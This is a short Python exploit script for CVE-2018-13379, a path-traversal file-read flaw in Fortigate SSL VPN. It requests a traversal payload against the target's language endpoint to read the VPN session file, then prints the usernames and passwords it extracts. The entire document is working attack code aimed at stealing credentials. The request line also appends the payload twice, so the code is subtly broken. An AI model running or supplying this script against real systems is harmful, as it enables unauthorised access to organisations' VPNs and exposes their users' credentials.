#!/usr/bin/python
#
# Exploit to verify Fortigate Unauthenticated LFI (CVE-2018-13379) vulnerability
# and extract all current sessions.
#
#
# Usage: python CVE-2018-13379.py https://target.com:PORT
#

import sys
import re
import requests

hostname = sys.argv[1]

path = "/remote/fgt_lang?lang="
payload = "/../../../..//////////dev/cmdb/sslvpn_websession"

url = hostname + path + payload

test = requests.get(url + payload, verify=False)
if test.status_code != 200:
	print "Target is not vulnerable"
if test.status_code == 200:
	print "Target is vulnerable. Trying to get sessions (users and passwords) ..."
	input = re.findall("[^\x00-\x1F\x7F-\xFF]{4,}", test.content)
	data = re.split(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', ','.join(input))
	data.pop(0)
	for _usr in data:
		usr = _usr.split(",")
		print "Username: " + usr[1] + " / Password: " + usr[2]

